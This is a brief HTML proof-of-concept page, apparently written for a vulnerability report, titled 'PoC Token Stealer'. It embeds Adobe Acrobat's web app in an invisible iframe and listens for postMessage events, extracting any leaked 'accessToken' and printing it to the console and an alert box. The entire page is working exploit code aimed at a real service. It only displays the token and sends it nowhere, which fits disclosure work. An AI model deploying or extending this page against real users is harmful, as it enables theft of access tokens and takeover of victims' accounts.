<!DOCTYPE html>
<html>
<head>
    <title>PoC Token Stealer</title>
</head>
<body>
    <h1>Listening for Tokens...</h1>
    <iframe id="victim" src="https://acrobat.adobe.com/link/home/" style="width:0;height:0;border:0;"></iframe>

    <script>
        window.addEventListener("message", (event) => {
            // Check if the message contains the accessToken
            if (event.data && event.data.includes("accessToken")) {
                console.log("CRITICAL: Stolen Token Found!");
                console.log(event.data);
                alert("Stolen Access Token: " + JSON.parse(event.data).message.accessToken);
            }
        }, false);
    </script>
</body>
</html>
